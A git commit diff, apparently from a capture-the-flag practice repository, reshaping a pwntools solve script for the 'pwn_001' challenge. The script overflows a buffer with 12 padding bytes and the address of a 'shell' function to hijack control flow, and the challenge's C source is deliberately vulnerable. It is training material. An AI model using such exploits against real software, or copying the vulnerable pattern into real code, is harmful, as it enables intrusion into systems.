5e7daf0a0fc208a8fd0b563342b2fa86cc517660
dmur1 <93072266+dmur1@users.noreply.github.com>
2024-02-04 09:42:47 +0000

    update pwn_001 a bit to a more standard form

--- pwn/pwn_001/go.py
+++ pwn/pwn_001/go.py
@@ -1,11 +1,29 @@
+#!/usr/bin/env python3
+
+#
+# pwn template made with 🚩 https://github.com/rerrorctf/rctf 🚩
+#
+
 from pwn import *
 
-elf = ELF("./task")
+#context.log_level = "debug"
+
+LOCAL_BINARY = "./task"
+REMOTE_IP = "127.0.0.1"
+REMOTE_PORT = 9001
+
+elf = ELF(LOCAL_BINARY)
+
+p = process(LOCAL_BINARY)
+#p = remote(REMOTE_IP, REMOTE_PORT)
+#gdb.attach(p, gdbscript="")
+
+# pwn it here
 
 payload = b"A" * 12
 payload += p64(elf.symbols["shell"])
 
-p = process("./task")
 p.sendline(payload)
+
 p.interactive()
 
--- pwn/pwn_001/task.c
+++ pwn/pwn_001/task.c
@@ -9,6 +9,10 @@ void shell() {
 }
 
 int main() {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+
     puts("do you like to pwn? y/n");
 
     char answer[4];
